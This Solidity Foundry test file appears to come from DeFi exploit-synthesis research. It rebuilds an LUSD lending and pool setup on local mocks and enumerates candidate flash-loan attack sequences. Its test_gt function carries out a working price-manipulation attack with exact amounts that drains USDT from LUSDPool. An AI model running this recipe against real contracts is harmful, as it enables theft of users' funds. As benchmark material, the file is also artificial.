// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {BTCB} from "./BTCB.sol";
import {LUSDPool} from "./LUSDPool.sol";
import {LUSD} from "./LUSD.sol";
import {Loan} from "./Loan.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract LUSDTest is Test, BlockLoader {
    LUSD lusd;
    USDT usdt;
    BTCB btcb;
    UniswapV2Pair pairub;
    Loan loan;
    LUSDPool lusdpool;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address lusdAddr;
    address usdtAddr;
    address btcbAddr;
    address pairubAddr;
    address loanAddr;
    address lusdpoolAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1688739883;
    uint112 reserve0pairub = 39642343651114056995536;
    uint112 reserve1pairub = 1308898664806062396;
    uint32 blockTimestampLastpairub = 1688739223;
    uint256 kLastpairub = 51887196927467385887309980034445437588425;
    uint256 price0CumulativeLastpairub = 12431333659948558633401636190069607866;
    uint256 price1CumulativeLastpairub =
        12097259681955297829508020796774546606420529779;
    uint256 totalSupplylusd = 141564475521947017865227;
    uint256 balanceOflusdpairub = 0;
    uint256 balanceOflusdloan = 0;
    uint256 balanceOflusdlusdpool = 1000000000;
    uint256 balanceOflusdattacker = 0;
    uint256 totalSupplyusdt = 3379997906401637314353418690;
    uint256 balanceOfusdtpairub = 39642343651114056995536;
    uint256 balanceOfusdtloan = 0;
    uint256 balanceOfusdtlusdpool = 10000411182292800000000;
    uint256 balanceOfusdtattacker = 0;
    uint256 totalSupplybtcb = 60500999999999993999744;
    uint256 balanceOfbtcbpairub = 1308898664806062396;
    uint256 balanceOfbtcbloan = 0;
    uint256 balanceOfbtcblusdpool = 0;
    uint256 balanceOfbtcbattacker = 0;

    function setUp() public {
        owner = address(this);
        lusd = new LUSD(owner);
        lusdAddr = address(lusd);
        usdt = new USDT();
        usdtAddr = address(usdt);
        btcb = new BTCB();
        btcbAddr = address(btcb);
        pairub = new UniswapV2Pair(
            address(usdt),
            address(btcb),
            reserve0pairub,
            reserve1pairub,
            blockTimestampLastpairub,
            kLastpairub,
            price0CumulativeLastpairub,
            price1CumulativeLastpairub
        );
        pairubAddr = address(pairub);
        loan = new Loan(owner);
        loanAddr = address(loan);
        lusdpool = new LUSDPool(owner);
        lusdpoolAddr = address(lusdpool);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pairub),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(pairub), balanceOfusdtpairub);
        btcb.transfer(address(pairub), balanceOfbtcbpairub);
        usdt.transfer(address(lusdpool), balanceOfusdtlusdpool);
        lusd.transfer(address(lusdpool), balanceOflusdlusdpool);
        loan.afterDeploy(address(usdt), address(router));
        lusdpool.afterDeploy(address(usdt), address(router));
        loan.setAddrs(address(lusd));
        lusdpool.setAddrs(address(lusd));
        loan.setInfo(address(btcb), address(lusd), 1, 5000, 1);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Lusd Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(lusd),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(lusd),
            address(lusd),
            lusd.decimals()
        );
        queryERC20BalanceDecimals(
            address(btcb),
            address(lusd),
            btcb.decimals()
        );
        emit log_string("");
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(lusd),
            address(usdt),
            lusd.decimals()
        );
        queryERC20BalanceDecimals(
            address(btcb),
            address(usdt),
            btcb.decimals()
        );
        emit log_string("");
        emit log_string("Btcb Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(btcb),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(lusd),
            address(btcb),
            lusd.decimals()
        );
        queryERC20BalanceDecimals(
            address(btcb),
            address(btcb),
            btcb.decimals()
        );
        emit log_string("");
        emit log_string("Pairub Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pairub),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(lusd),
            address(pairub),
            lusd.decimals()
        );
        queryERC20BalanceDecimals(
            address(btcb),
            address(pairub),
            btcb.decimals()
        );
        emit log_string("");
        emit log_string("Loan Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(loan),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(lusd),
            address(loan),
            lusd.decimals()
        );
        queryERC20BalanceDecimals(
            address(btcb),
            address(loan),
            btcb.decimals()
        );
        emit log_string("");
        emit log_string("Lusdpool Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(lusdpool),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(lusd),
            address(lusdpool),
            lusd.decimals()
        );
        queryERC20BalanceDecimals(
            address(btcb),
            address(lusdpool),
            btcb.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(lusd),
            address(attacker),
            lusd.decimals()
        );
        queryERC20BalanceDecimals(
            address(btcb),
            address(attacker),
            btcb.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 8000 + balanceOfusdtattacker;
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_lusd_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        lusd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_lusd_owner(uint256 amount) internal eurus {
        lusd.transfer(owner, amount);
    }

    function borrow_btcb_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        btcb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_btcb_owner(uint256 amount) internal eurus {
        btcb.transfer(owner, amount);
    }

    function swap_pairub_attacker_usdt_btcb(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(pairub), amount);
        pairub.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pairub_attacker_btcb_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        btcb.transfer(address(pairub), amount);
        pairub.swap(amountOut, 0, attacker, new bytes(0));
    }

    function swap_loan_attacker_btcb_lusd(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        btcb.approve(address(loan), type(uint256).max);
        loan.supply(address(btcb), amount);
    }

    function withdraw_lusdpool_lusd_usdt(uint256 amount) internal eurus {
        lusd.approve(address(lusdpool), type(uint256).max);
        lusdpool.withdraw(amount);
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pairub_attacker_usdt_btcb(amt1, amt2);
        swap_pairub_attacker_btcb_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_btcb_owner(amt0);
        swap_pairub_attacker_btcb_usdt(amt1, amt2);
        swap_pairub_attacker_usdt_btcb(amt3, amt4);
        payback_btcb_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pairub_attacker_usdt_btcb(amt1, amt2);
        swap_loan_attacker_btcb_lusd(amt3, amt4);
        withdraw_lusdpool_lusd_usdt(amt5);
        payback_usdt_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt8 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pairub_attacker_usdt_btcb(amt1, amt2);
        swap_loan_attacker_btcb_lusd(amt3, amt4);
        withdraw_lusdpool_lusd_usdt(amt5);
        swap_pairub_attacker_btcb_usdt(amt6, amt7);
        payback_usdt_owner(amt8);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_lusd_owner(amt0);
        withdraw_lusdpool_lusd_usdt(amt1);
        swap_pairub_attacker_usdt_btcb(amt2, amt3);
        swap_loan_attacker_btcb_lusd(amt4, amt5);
        payback_lusd_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_btcb_owner(amt0);
        swap_loan_attacker_btcb_lusd(amt1, amt2);
        withdraw_lusdpool_lusd_usdt(amt3);
        swap_pairub_attacker_usdt_btcb(amt4, amt5);
        payback_btcb_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pairub_attacker_usdt_btcb(amt1, amt2);
        swap_pairub_attacker_btcb_usdt(amt3, amt4);
        swap_pairub_attacker_usdt_btcb(amt5, amt6);
        swap_pairub_attacker_btcb_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_btcb_owner(amt0);
        swap_pairub_attacker_btcb_usdt(amt1, amt2);
        swap_pairub_attacker_usdt_btcb(amt3, amt4);
        swap_pairub_attacker_btcb_usdt(amt5, amt6);
        swap_pairub_attacker_usdt_btcb(amt7, amt8);
        payback_btcb_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pairub_attacker_usdt_btcb(amt1, amt2);
        swap_pairub_attacker_btcb_usdt(amt3, amt4);
        swap_pairub_attacker_usdt_btcb(amt5, amt6);
        swap_loan_attacker_btcb_lusd(amt7, amt8);
        withdraw_lusdpool_lusd_usdt(amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pairub_attacker_usdt_btcb(amt1, amt2);
        swap_loan_attacker_btcb_lusd(amt3, amt4);
        withdraw_lusdpool_lusd_usdt(amt5);
        swap_pairub_attacker_usdt_btcb(amt6, amt7);
        swap_pairub_attacker_btcb_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_lusd_owner(amt0);
        withdraw_lusdpool_lusd_usdt(amt1);
        swap_pairub_attacker_usdt_btcb(amt2, amt3);
        swap_pairub_attacker_btcb_usdt(amt4, amt5);
        swap_pairub_attacker_usdt_btcb(amt6, amt7);
        swap_loan_attacker_btcb_lusd(amt8, amt9);
        payback_lusd_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_btcb_owner(amt0);
        swap_pairub_attacker_btcb_usdt(amt1, amt2);
        swap_pairub_attacker_usdt_btcb(amt3, amt4);
        swap_loan_attacker_btcb_lusd(amt5, amt6);
        withdraw_lusdpool_lusd_usdt(amt7);
        swap_pairub_attacker_usdt_btcb(amt8, amt9);
        payback_btcb_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_btcb_owner(amt0);
        swap_loan_attacker_btcb_lusd(amt1, amt2);
        withdraw_lusdpool_lusd_usdt(amt3);
        swap_pairub_attacker_usdt_btcb(amt4, amt5);
        swap_pairub_attacker_btcb_usdt(amt6, amt7);
        swap_pairub_attacker_usdt_btcb(amt8, amt9);
        payback_btcb_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pairub_attacker_usdt_btcb(amt1, amt2);
        swap_loan_attacker_btcb_lusd(amt3, amt4);
        withdraw_lusdpool_lusd_usdt(amt5);
        swap_pairub_attacker_usdt_btcb(amt6, amt7);
        swap_loan_attacker_btcb_lusd(amt8, amt9);
        withdraw_lusdpool_lusd_usdt(amt10);
        payback_usdt_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_lusd_owner(amt0);
        withdraw_lusdpool_lusd_usdt(amt1);
        swap_pairub_attacker_usdt_btcb(amt2, amt3);
        swap_loan_attacker_btcb_lusd(amt4, amt5);
        withdraw_lusdpool_lusd_usdt(amt6);
        swap_pairub_attacker_usdt_btcb(amt7, amt8);
        swap_loan_attacker_btcb_lusd(amt9, amt10);
        payback_lusd_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_btcb_owner(amt0);
        swap_loan_attacker_btcb_lusd(amt1, amt2);
        withdraw_lusdpool_lusd_usdt(amt3);
        swap_pairub_attacker_usdt_btcb(amt4, amt5);
        swap_loan_attacker_btcb_lusd(amt6, amt7);
        withdraw_lusdpool_lusd_usdt(amt8);
        swap_pairub_attacker_usdt_btcb(amt9, amt10);
        payback_btcb_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_usdt_owner(980925 * 1e18);
        printBalance("After step0 ");
        swap_pairub_attacker_usdt_btcb(
            (usdt.balanceOf(attacker) * 5) / 6,
            1246953598313175025
        );
        printBalance("After step1 ");
        swap_loan_attacker_btcb_lusd(1515366635982742, 10000 * 1e18);
        printBalance("After step2 ");
        withdraw_lusdpool_lusd_usdt(lusd.balanceOf(attacker));
        printBalance("After step3 ");
        swap_pairub_attacker_btcb_usdt(
            btcb.balanceOf(attacker),
            pairub.getAmountOut(btcb.balanceOf(attacker), address(btcb))
        );
        printBalance("After step4 ");
        payback_usdt_owner(980925 * 1e18);
        printBalance("After step5 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt8 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pairub_attacker_usdt_btcb(amt1, amt2);
        swap_loan_attacker_btcb_lusd(amt3, amt4);
        withdraw_lusdpool_lusd_usdt(amt5);
        swap_pairub_attacker_btcb_usdt(amt6, amt7);
        payback_usdt_owner(amt8);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
